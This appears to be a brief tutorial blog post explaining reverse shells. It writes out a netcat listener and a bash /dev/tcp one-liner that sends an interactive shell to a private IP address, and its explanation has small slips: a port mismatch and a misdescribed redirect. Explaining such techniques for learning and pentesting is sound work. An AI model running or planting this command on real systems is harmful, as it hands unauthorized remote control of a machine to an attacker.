# Doc
Whats a reverse shell? 

Not quite but, you aren’t alone in ignorance. It is surprising that the number of folks that don’t actually know what a reverse shell is. Long story short, it is when one computer connects to another computer but the initiating computer forwards their shell to the destination. It is commonplace that a reverse shell happens during an attack or as part of a pentest. They are scary attacks because it gives an attacker an interactive shell on a machine that they should not have had access to inside of the “hardened” area.

- Lets break down how this works. 
First there is a machine listening somewhere on a specific tcp port. In this case using netcat.

```bash
$ nc -vlp 80 
-v, — verbose Set verbosity level (can be used several times); 
-l, — listen Bind and listen for incoming connections; 
-p, — source-port port Specify source port to use 
(http://man7.org/linux/man-pages/man1/ncat.1.html) 
```
Simple enough, just a listener on a specific port. Second, we will need another machine, the victim, to connect to this machine and then forward the session to it. There are countless ways to setup this connection depending what resources are available. This is how to do it with bash


```bash
$ bash -i >& /dev/tcp/192.168.1.142/80 0>&1
```
The command *bash -i >&* invokes bash with an “interactive” option. Then */dev/tcp/192.168.1.142/7023* redirects that session to a tcp socket via device file. 
Finally *0>&1* Takes standard output, and connects it to standard input.

It turns out linux has built a */dev/tcp* device file. While powerful and useful this file can be extremely dangerous when used in this way. This built in device file lets bash connect directly to any ip and any port out there. This also works well if you want to confirm a port is open, or check the time.
